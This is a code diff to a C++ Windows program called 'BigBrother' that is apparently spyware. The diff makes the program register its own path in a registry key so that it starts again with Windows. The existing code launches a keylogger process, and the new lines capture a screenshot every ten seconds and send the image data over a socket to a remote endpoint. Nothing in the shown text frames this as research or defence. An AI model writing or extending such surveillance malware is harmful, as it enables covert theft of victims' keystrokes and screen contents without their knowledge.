@@ -1,5 +1,7 @@
 #include "BigBrother.hpp"
 
+#define STB_IMAGE_IMPLEMENTATION
+#include "stb_image.h"
 
 double wtime()
 {
@@ -49,7 +51,10 @@ int main()
         0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
             cout << "registry write error" << endl;
 
-    if (RegSetValueEx(hKey, "BigBrother", 0, REG_SZ, (BYTE*)"E:\\BigBrother\\a.exe ", 32)
+    char DirPath[MAX_PATH];
+    GetModuleFileName(GetModuleHandle(0), DirPath, MAX_PATH);
+
+    if (RegSetValueEx(hKey, "BigBrother", 0, REG_SZ, (BYTE *)DirPath, 32)
         != ERROR_SUCCESS )
             cout << "registry write error" << endl;
 
@@ -69,10 +74,21 @@ int main()
     if ((CreateProc(procname)) == 1)
         cout << "key logger start failed" << endl;
 
+    int w, h, c;
+
     while (1) {
         t = wtime();
-        while ((wtime() - t) != 10) {}
+        while ((wtime() - t) < 10) {}
         SaveBitmap(filename);
+
+        ConnectSocket = client();
+        char *image_data = (char *)stbi_load("C:\\ProgramData\\prtscr.png", &w, &h, &c, 3);
+        char *prtscr = "screenshot";
+        send(ConnectSocket, prtscr, (int)strlen(prtscr), 0);
+
+        ConnectSocket = client();
+        int screen_size = w * h * 3;
+        send(ConnectSocket, image_data, screen_size, 0);
     }
 
     return 0;
